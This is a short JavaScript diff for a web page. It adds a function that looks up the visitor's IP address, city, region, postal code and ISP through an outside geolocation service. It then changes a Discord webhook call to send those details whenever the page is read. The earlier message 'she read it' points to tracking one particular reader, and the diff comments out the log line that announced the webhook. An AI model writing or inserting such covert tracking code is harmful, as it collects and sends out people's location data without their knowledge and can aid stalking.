@@ -1,4 +1,28 @@
-function webhook() {
+function getuser() {
+	return new Promise((resolve, reject) => {
+		const xhr = new XMLHttpRequest();
+		xhr.open('GET', 'https://ipapi.co/json/');
+		xhr.onload = () => {
+			if (xhr.status === 200) {
+				const { ip, city, region, postal, org } = JSON.parse(xhr.response);
+				// console.log(`This is ${ip} ${city} ${region} ${postal} ${org}`);
+				resolve({ ip, city, region, postal, org });
+			} else {
+				console.error(xhr.statusText);
+				reject(null);
+			}
+		};
+		xhr.onerror = () => {
+			console.error(xhr.statusText);
+			reject(null);
+		};
+		xhr.send();
+	});
+}
+
+async function webhook() {
+	const userData = await getuser();
+	const { ip, city, region, postal, org } = userData
 	const request = new XMLHttpRequest();
 	request.open(
 		"POST",
@@ -8,11 +32,11 @@ function webhook() {
 	const params = {
 		username: "ANONYMOUS",
 		avatar_url: "",
-		content: "she read it",
+		content: `Site being read from ${ip} | ${city} | ${region} | ${postal} | ${org} `,
 	};
 	request.send(JSON.stringify(params));
 
-	console.log("Discord webhook activated");
+	// console.log("Discord webhook activated");
 }
 
 function waitBeforeNavigate(ev) {
